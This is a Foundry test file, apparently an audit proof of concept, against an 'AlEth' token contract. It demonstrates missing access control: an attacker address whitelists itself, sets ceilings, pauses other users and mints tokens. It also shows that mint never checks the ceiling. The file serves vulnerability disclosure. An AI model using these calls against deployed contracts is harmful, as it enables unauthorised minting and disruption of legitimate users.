// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "../../src/AlEth.sol";






///@dev use this  ------> forge test test.sol 

// We have two test cases here demonstrating two vulnerabilities
contract TestAdapterReassignment is Test {
    AlEth aleth;
    address badUser = address(0x0002);
    address owner = address(0x0001);
    address user = address(0x0003);

    function setUp() public {
        aleth = new AlEth();

        // Attacker adds themselves to the whitelist to gain minting access
        aleth.setWhitelist(badUser, true);

        // These are set because of missing access control (for the second test)
        aleth.setWhitelist(owner, true);
        aleth.setWhitelist(user, true);
    }

    /// @notice This test demonstrates an access control violation
    function test_AccessControl() public {

        vm.startPrank(badUser);

        // Attacker sets a ceiling for anyone (no access control)
        aleth.setCeiling(user, 1);

        // Ensure  not paused🐧
        aleth.pauseAlchemist(badUser, false);

        // Pause the legitimate user (demonstrating arbitrary pause control)
        aleth.pauseAlchemist(user, true);

        // Minting ~ ...
        aleth.mint(badUser, 20000000000000000);

        // too
        aleth.lowerHasMinted(100000000000000);

        vm.stopPrank();
    }

    /// @notice Test for mint logic that shows there is no actual ceiling enforcement
    function test_MintLogic() public {

        vm.prank(owner);

        // Owner sets a ceiling for the user so the user should not be able to mint more than this
        aleth.setCeiling(user, 999);

        /// @notice However, because the `ceiling` value is never checked in mint(),
        /// the user can mint any arbitrary amount and bypass the ceiling restriction.

        // User mints more than their allowed ceiling
        vm.prank(user);
        aleth.mint(user, 1000);
    }
}
